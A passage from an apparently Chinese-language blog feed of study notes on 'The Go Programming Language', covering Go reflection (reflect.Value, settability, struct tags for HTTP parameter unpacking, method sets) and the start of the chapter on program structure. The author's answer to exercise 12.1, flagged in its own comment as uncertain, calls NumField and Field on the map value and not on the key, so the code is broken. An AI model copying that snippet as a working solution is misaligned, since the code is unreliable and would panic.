(*&amp;i).value = 3\n</code></pre></div><p>在第一个例子中，<code>Display</code>函数调用<code>reflect.ValueOf(i)</code>，它返回一个<code>Int</code>类型的值。正如我们在12.2节中提到的，<code>reflect.ValueOf</code>总是返回一个具体类型的 <code>Value</code>，因为它是从一个接口值提取的内容。</p>\n<p>在第二个例子中，<code>Display</code>函数调用的是<code>reflect.ValueOf(&amp;i)</code>，它返回一个指向i的指针，对应<code>Ptr</code>类型。在<code>switch</code>的<code>Ptr</code>分支中，对这个值调用 <code>Elem</code> 方法，返回一个<code>Value</code>来表示变量<code>i</code>本身，对应<code>Interface</code>类型。像这样一个间接获得的<code>Value</code>，可能代表任意类型的值，包括接口类型。<code>display</code>函数递归调用自身，这次它分别打印了这个接口的动态类型和值。</p>\n<p><strong>练习 12.1：</strong> 扩展Display函数，使它可以显示包含以结构体或数组作为<code>map</code>的<code>key</code>类型的值。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">case</span> reflect<span class=\"token punctuation\">.</span>Map<span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> key <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">MapKeys</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token comment\">// XXX: 咱也不道对不对</span>\n\t\t\t<span class=\"token keyword\">if</span> key<span class=\"token punctuation\">.</span><span class=\"token function\">Kind</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> reflect<span class=\"token punctuation\">.</span>Struct <span class=\"token punctuation\">{</span>\n\t\t\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">NumField</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t\tfieldPath <span class=\"token operator\">:=</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s.%s\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Field</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>Name<span class=\"token punctuation\">)</span>\n\t\t\t\t\t<span class=\"token function\">display</span><span class=\"token punctuation\">(</span>fieldPath<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Field</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t<span class=\"token function\">display</span><span class=\"token punctuation\">(</span>fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s[%s]\"</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> <span class=\"token function\">formatAtom</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">MapIndex</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token punctuation\">}</span>\n</code></pre></div><p><strong>练习 12.2：</strong> 增强display函数的稳健性，通过记录边界的步数来确保在超出一定限制后放弃递归。（在13.3节，我们会看到另一种探测数据结构是否存在环的技术。）</p>\n<h2>12.4. 示例: 编码为S表达式</h2>\n<p>这节先不看了，似乎没啥意思</p>\n<h2>12.5. 通过reflect.Value修改值</h2>\n<p>回想一下，Go语言中类似<code>x</code>、<code>x.f[1]</code>和<code>*p</code>形式的表达式都可以表示变量，但是其它如<code>x + 1</code>和<code>f(2)</code>则不是变量。一个变量就是一个可寻址的内存空间，里面存储了一个值，并且存储的值可以通过内存地址来更新。</p>\n<p>对于<code>reflect.Values</code>也有类似的区别。有一些<code>reflect.Values</code>是可取地址的；其它一些则不可以。考虑以下的声明语句：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>x := 2                   // value   type    variable?\na := reflect.ValueOf(2)  // 2       int     no\nb := reflect.ValueOf(x)  // 2       int     no\nc := reflect.ValueOf(&amp;x) // &amp;x      *int    no\nd := c.Elem()            // 2       int     yes (x)\n</code></pre></div><p>其中<code>a</code>对应的变量不可取地址。因为a中的值仅仅是整数2的拷贝副本。<code>b</code>中的值也同样不可取地址。<code>c</code>中的值还是不可取地址，它只是一个指针<code>&amp;x</code>的拷贝。实际上，所有通过<code>reflect.ValueOf(x)</code>返回的<code>reflect.Value</code>都是不可取地址的。但是对于<code>d</code>，它是<code>c</code>的解引用方式生成的，指向另一个变量，因此是可取地址的。我们可以通过调用<code>reflect.ValueOf(&amp;x).Elem()</code>，来获取任意变量<code>x</code>对应的可取地址的<code>Value</code>。</p>\n<p>我们可以通过调用<code>reflect.Value</code>的<code>CanAddr</code>方法来判断其是否可以被取地址：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(a.CanAddr()) // \"false\"\nfmt.Println(b.CanAddr()) // \"false\"\nfmt.Println(c.CanAddr()) // \"false\"\nfmt.Println(d.CanAddr()) // \"true\"\n</code></pre></div><p>每当我们通过指针间接地获取的<code>reflect.Value</code>都是可取地址的，即使开始的是一个不可取地址的<code>Value</code>。在反射机制中，所有关于是否支持取地址的规则都是类似的。以此类推，<code>reflect.ValueOf(e).Index(i)</code>对应的值也是可取地址的，即使原始的<code>reflect.ValueOf(e)</code>不支持也没有关系。</p>\n<p>要从变量对应的可取地址的<code>reflect.Value</code>来访问变量需要三个步骤。第一步是调用<code>Addr()</code>方法，它返回一个<code>Value</code>，里面保存了指向变量的指针。然后是在<code>Value</code>上调用<code>Interface()</code>方法，也就是返回一个<code>interface{}</code>，里面包含指向变量的指针。最后，如果我们知道变量的类型，我们可以使用类型的断言机制将得到的<code>interface{}</code>类型的接口强制转为普通的类型指针。这样我们就可以通过这个普通指针来更新变量了：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>x := 2\nd := reflect.ValueOf(&amp;x).Elem()   // d refers to the variable x\npx := d.Addr().Interface().(*int) // px := &amp;x\n*px = 3                           // x = 3\nfmt.Println(x)                    // \"3\"\n</code></pre></div><p>或者，不使用指针，而是通过调用可取地址的<code>reflect.Value</code>的<code>reflect.Value.Set</code>方法来更新对应的值：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>d.Set(reflect.ValueOf(4))\nfmt.Println(x) // \"4\"\n</code></pre></div><p><code>Set</code>方法将在运行时执行和编译时进行类似的可赋值性约束的检查。以上代码，变量和值都是int类型，但是如果变量是int64类型，那么程序将抛出一个panic异常，所以关键问题是要确保改类型的变量可以接受对应的值：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>d.Set(reflect.ValueOf(int64(5))) // panic: int64 is not assignable to int\n</code></pre></div><p>同样，对一个不可取地址的<code>reflect.Value</code>调用Set方法也会导致panic异常：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>x := 2\nb := reflect.ValueOf(x)\nb.Set(reflect.ValueOf(3)) // panic: Set using unaddressable value\n</code></pre></div><p>这里有很多用于基本数据类型的Set方法：<code>SetInt</code>、<code>SetUint</code>、<code>SetString</code>和<code>SetFloat</code>等。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>d := reflect.ValueOf(&amp;x).Elem()\nd.SetInt(3)\nfmt.Println(x) // \"3\"\n</code></pre></div><p>从某种程度上说，这些Set方法总是尽可能地完成任务。以<code>SetInt</code>为例，只要变量是某种类型的有符号整数就可以工作，即使是一些命名的类型、甚至只要底层数据类型是有符号整数就可以，而且如果对于变量类型值太大的话会被自动截断。但需要谨慎的是：对于一个引用<code>interface{}</code>类型的<code>reflect.Value</code>调用<code>SetInt</code>会导致panic异常，即使那个<code>interface{}</code>变量对于整数类型也不行。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>x := 1\nrx := reflect.ValueOf(&amp;x).Elem()\nrx.SetInt(2)                     // OK, x = 2\nrx.Set(reflect.ValueOf(3))       // OK, x = 3\nrx.SetString(\"hello\")            // panic: string is not assignable to int\nrx.Set(reflect.ValueOf(\"hello\")) // panic: string is not assignable to int\n\nvar y interface{}\nry := reflect.ValueOf(&amp;y).Elem()\nry.SetInt(2)                     // panic: SetInt called on interface Value\nry.Set(reflect.ValueOf(3))       // OK, y = int(3)\nry.SetString(\"hello\")            // panic: SetString called on interface Value\nry.Set(reflect.ValueOf(\"hello\")) // OK, y = \"hello\"\n</code></pre></div><p>当我们用<code>Display</code>显示<code>os.Stdout</code>结构时，我们发现反射可以越过Go语言的导出规则的限制读取结构体中未导出的成员，比如在类Unix系统上<code>os.File</code>结构体中的<code>fd int</code>成员。然而，利用反射机制并不能修改这些未导出的成员：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>stdout := reflect.ValueOf(os.Stdout).Elem() // *os.Stdout, an os.File var\nfmt.Println(stdout.Type())                  // \"os.File\"\nfd := stdout.FieldByName(\"fd\")\nfmt.Println(fd.Int()) // \"1\"\nfd.SetInt(2)          // panic: unexported field\n</code></pre></div><p>一个可取地址的<code>reflect.Value</code>会记录一个结构体成员是否是未导出成员，如果是的话则拒绝修改操作。因此，<code>CanAddr</code>方法并不能正确反映一个变量是否是可以被修改的。</p>\n<p>相关的方法<code>CanSet</code>是用于检查对应的<code>reflect.Value</code>是否是可取地址并可被修改的：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(fd.CanAddr(), fd.CanSet()) // \"true false\"\n</code></pre></div><blockquote>\n<p>可取地址不一定能被修改，能被修改一定可取地址</p>\n</blockquote>\n<h2>12.7. 获取结构体字段标签</h2>\n<p>对于一个web服务，大部分HTTP处理函数要做的第一件事情就是展开请求中的参数到本地变量中。我们定义了一个工具函数，叫<code>params.Unpack</code>，通过使用结构体成员标签机制来让HTTP处理函数解析请求参数更方便。</p>\n<p>下面的search函数是一个HTTP请求处理函数。它定义了一个匿名结构体类型的变量，用结构体的每个成员表示HTTP请求的参数。其中结构体成员标签指明了对于请求参数的名字，为了减少URL的长度这些参数名通常都是神秘的缩略词。Unpack将请求参数填充到合适的结构体成员中，这样我们可以方便地通过合适的类型类来访问这些参数。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// search implements the /search URL endpoint.\nfunc search(resp http.ResponseWriter, req *http.Request) {\n    var data struct {\n        Labels     []string `http:\"l\"`\n        MaxResults int      `http:\"max\"`\n        Exact      bool     `http:\"x\"`\n    }\n    data.MaxResults = 10 // set default\n    if err := params.Unpack(req, &amp;data); err != nil {\n        http.Error(resp, err.Error(), http.StatusBadRequest) // 400\n        return\n    }\n\n    // ...rest of handler...\n    fmt.Fprintf(resp, \"Search: %+v\\n\", data)\n}\n</code></pre></div><p>下面的Unpack函数主要完成三件事情。第一，它调用<code>req.ParseForm()</code>来解析HTTP请求。然后，<code>req.Form</code>将包含所有的请求参数，不管HTTP客户端使用的是GET还是POST请求方法。</p>\n<p>下一步，Unpack函数将构建每个结构体成员有效参数名字到成员变量的映射。如果结构体成员有成员标签的话，有效参数名字可能和实际的成员名字不相同。<code>reflect.Type</code>的<code>Field</code>方法将返回一个<code>reflect.StructField</code>，里面含有每个成员的名字、类型和可选的成员标签等信息。其中成员标签信息对应<code>reflect.StructTag</code>类型的字符串，并且提供了Get方法用于解析和根据特定key提取的子串，例如这里的http:\"...\"形式的子串。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// Unpack populates the fields of the struct pointed to by ptr</span>\n<span class=\"token comment\">// from the HTTP request parameters in req.</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">Unpack</span><span class=\"token punctuation\">(</span>req <span class=\"token operator\">*</span>http<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">,</span> ptr <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">ParseForm</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> err\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Build map of fields keyed by effective name.</span>\n    fields <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">]</span>reflect<span class=\"token punctuation\">.</span>Value<span class=\"token punctuation\">)</span>\n    v <span class=\"token operator\">:=</span> reflect<span class=\"token punctuation\">.</span><span class=\"token function\">ValueOf</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Elem</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// the struct variable</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">NumField</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n        fieldInfo <span class=\"token operator\">:=</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Field</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token comment\">// a reflect.StructField</span>\n        tag <span class=\"token operator\">:=</span> fieldInfo<span class=\"token punctuation\">.</span>Tag           <span class=\"token comment\">// a reflect.StructTag</span>\n        name <span class=\"token operator\">:=</span> tag<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> name <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span> <span class=\"token punctuation\">{</span>\n            name <span class=\"token operator\">=</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">ToLower</span><span class=\"token punctuation\">(</span>fieldInfo<span class=\"token punctuation\">.</span>Name<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n        fields<span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Field</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Update struct field for each parameter in the request.</span>\n    <span class=\"token keyword\">for</span> name<span class=\"token punctuation\">,</span> values <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> req<span class=\"token punctuation\">.</span>Form <span class=\"token punctuation\">{</span>\n        f <span class=\"token operator\">:=</span> fields<span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>f<span class=\"token punctuation\">.</span><span class=\"token function\">IsValid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">continue</span> <span class=\"token comment\">// ignore unrecognized HTTP parameters</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> value <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> values <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">Kind</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> reflect<span class=\"token punctuation\">.</span>Slice <span class=\"token punctuation\">{</span>\n                elem <span class=\"token operator\">:=</span> reflect<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span><span class=\"token function\">Type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Elem</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Elem</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> <span class=\"token function\">populate</span><span class=\"token punctuation\">(</span>elem<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s: %v\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">}</span>\n                f<span class=\"token punctuation\">.</span><span class=\"token function\">Set</span><span class=\"token punctuation\">(</span>reflect<span class=\"token punctuation\">.</span><span class=\"token function\">Append</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> elem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> <span class=\"token function\">populate</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s: %v\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>最后，Unpack遍历HTTP请求的name/valu参数键值对，更新相应的结构体成员。。如果同一个名字的参数可能出现多次，并且对应的结构体成员是一个slice，那么就将所有的参数添加到slice中。对应的成员值将被覆盖，只有最后一次出现的参数值才是起作用的。</p>\n<p>populate函数用请求的字符串类型参数值来填充单一的成员v（或者是slice类型成员中的单一的元素）。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">populate</span><span class=\"token punctuation\">(</span>v reflect<span class=\"token punctuation\">.</span>Value<span class=\"token punctuation\">,</span> value <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">switch</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Kind</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">case</span> reflect<span class=\"token punctuation\">.</span>String<span class=\"token punctuation\">:</span>\n        v<span class=\"token punctuation\">.</span><span class=\"token function\">SetString</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">case</span> reflect<span class=\"token punctuation\">.</span>Int<span class=\"token punctuation\">:</span>\n        i<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> strconv<span class=\"token punctuation\">.</span><span class=\"token function\">ParseInt</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> err\n        <span class=\"token punctuation\">}</span>\n        v<span class=\"token punctuation\">.</span><span class=\"token function\">SetInt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">case</span> reflect<span class=\"token punctuation\">.</span>Bool<span class=\"token punctuation\">:</span>\n        b<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> strconv<span class=\"token punctuation\">.</span><span class=\"token function\">ParseBool</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> err\n        <span class=\"token punctuation\">}</span>\n        v<span class=\"token punctuation\">.</span><span class=\"token function\">SetBool</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Errorf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unsupported kind %s\"</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span><span class=\"token function\">Type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><figure><figcaption>image-20240731161711817</figcaption></figure>\n<h2>12.8. 显示一个类型的方法集</h2>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// Print prints the method set of the value x.\nfunc Print(x interface{}) {\n    v := reflect.ValueOf(x)\n    t := v.Type()\n    fmt.Printf(\"type %s\\n\", t)\n\n    for i := 0; i &lt; v.NumMethod(); i++ {\n        methType := v.Method(i).Type()\n        fmt.Printf(\"func (%s) %s%s\\n\", t, t.Method(i).Name,\n            strings.TrimPrefix(methType.String(), \"func\"))\n    }\n}\n</code></pre></div><p><code>reflect.Type</code>和<code>reflect.Value</code>都提供了一个Method方法。每次<code>t.Method(i)</code>调用将一个<code>reflect.Method</code>的实例，对应一个用于描述一个方法的名称和类型的结构体。每次<code>v.Method(i)</code>方法调用都返回一个<code>reflect.Value</code>以表示对应的值（§6.4），也就是一个方法是绑到它的接收者的。使用<code>reflect.Value.Call</code>方法（我们这里没有演示），将可以调用一个<code>Func</code>类型的Value，但是这个例子中只用到了它的类型。</p>\n<p>这是属于<code>time.Duration</code>和<code>*strings.Replacer</code>两个类型的方法：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>methods.Print(time.Hour)\n// Output:\n// type time.Duration\n// func (time.Duration) Hours() float64\n// func (time.Duration) Minutes() float64\n// func (time.Duration) Nanoseconds() int64\n// func (time.Duration) Seconds() float64\n// func (time.Duration) String() string\n\nmethods.Print(new(strings.Replacer))\n// Output:\n// type *strings.Replacer\n// func (*strings.Replacer) Replace(string) string\n// func (*strings.Replacer) WriteString(io.Writer, string) (int, error)\n</code></pre></div><figure><figcaption>image-20240731164211191</figcaption></figure>\n",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-09-04T09:28:48.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "02. 程序结构",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch2.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/gopl/ch2.html",
      "summary": "02. 程序结构\n2.1. 命名\n关键字\nGo语言中类似if和switch的关键字有25个；关键字不能用于自定义名字，只能在特定语法结构中使用。\n此外，还有大约30多个预定义的名字，比如int和true等，主要对应内建的常量、类型和函数。\n这些内部预先定义的名字并不是关键字，你可以在定义中重新使用它们。在一些特殊的场景中重新定义它们也是有意义的，但是也...",
      "content_html": "\n<h2>2.1. 命名</h2>\n<h3>关键字</h3>\n<p>Go语言中类似if和switch的关键字有25个；关键字不能用于自定义名字，只能在特定语法结构中使用。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>break      default       func     interface   select\ncase       defer         go       map         struct\nchan       else          goto     package     switch\nconst      fallthrough   if       range       type\ncontinue   for           import   return      var\n</code></pre></div><p>此外，还有大约30多个预定义的名字，比如int和true等，主要对应内建的常量、类型和函数。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>内建常量: true false iota nil\n\n内建类型: int int8 int16 int32 int64\n          uint uint8 uint16 uint32 uint64 uintptr\n          float32 float64 complex128 complex64\n          bool byte rune string error\n\n内建函数: make len cap new append copy close delete\n          complex real imag\n          panic recover\n</code></pre></div><p>这些内部预先定义的名字并不是关键字，你可以在定义中重新使用它们。在一些特殊的场景中重新定义它们也是有意义的，但是也要注意避免过度而引起语义混乱。</p>\n<h3>命名规则</h3>\n<p>Go语言中的函数名、变量名、常量名、类型名、语句标号和包名等所有的命名，都遵循如下命名规则：</p>\n<ul>\n<li>一个名字必须以一个字母（Unicode字母）或下划线开头，后面可以跟任意数量的字母、数字或下划线。</li>\n<li>大写字母和小写字母是不同的：heapSort和Heapsort是两个不同的名字。</li>\n<li>如果一个名字是在函数内部定义，那么它就只在函数内部有效。如果是在函数外部定义，那么将在当前包的所有文件中都可以访问。</li>\n<li>名字的开头字母的大小写决定了名字在包外的可见性。如果一个名字是大写字母开头的，那么它将是导出的，也就是说可以被外部的包访问，例如fmt包的Printf函数就是导出的，可以在fmt包外部访问。</li>\n<li>包本身的名字一般总是用小写字母。</li>\n<li>名字的长度没有逻辑限制，但是Go语言的风格是尽量使用短小的名字，对于局部变量尤其是这样；你会经常看到i之类的短名字，而不是冗长的theLoopIndex命名。通常来说，如果一个名字的作用域比较大，生命周期也比较长，那么用长的名字将会更有意义。</li>\n<li>在习惯上，Go语言程序员推荐使用 <strong>驼峰式</strong> 命名，当名字由几个单词组成时优先使用大小写分隔，而不是优先用下划线分隔。</li>\n<li>像ASCII和HTML这样的缩略词则避免使用大小写混合的写法，它们可能被称为htmlEscape、HTMLEscape或escapeHTML，但不会是escapeHtml。</li>\n</ul>\n<h2>2.2. 声明</h2>\n<p>声明语句定义了程序的各种实体对象以及部分或全部的属性。Go语言主要有四种类型的声明语句：var、const、type和func，分别对应变量、常量、类型和函数实体对象的声明。</p>\n<p>一个Go语言编写的程序对应一个或多个以.go为文件后缀名的源文件。</p>\n<ul>\n<li>每个源文件中以包的声明语句开始，说明该源文件是属于哪个包</li>\n<li>包声明语句之后是import语句导入依赖的其它包</li>\n<li>然后是包一级的类型、变量、常量、函数的声明语句，包一级的各种类型的声明语句的顺序无关紧要（译注：函数内部的名字则必须先声明之后才能使用）。</li>\n</ul>\n<h3>变量&amp;常量声明</h3>\n<p>例如，下面的例子中声明了一个常量、一个函数和两个变量：</p>\n<p><em>gopl.io/ch2/boiling</em></p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// Boiling prints the boiling point of water.\npackage main\n\nimport \"fmt\"\n\nconst boilingF = 212.0\n\nfunc main() {\n    var f = boilingF\n    var c = (f - 32) * 5 / 9\n    fmt.Printf(\"boiling point = %g°F or %g°C\\n\", f, c)\n    // Output:\n    // boiling point = 212°F or 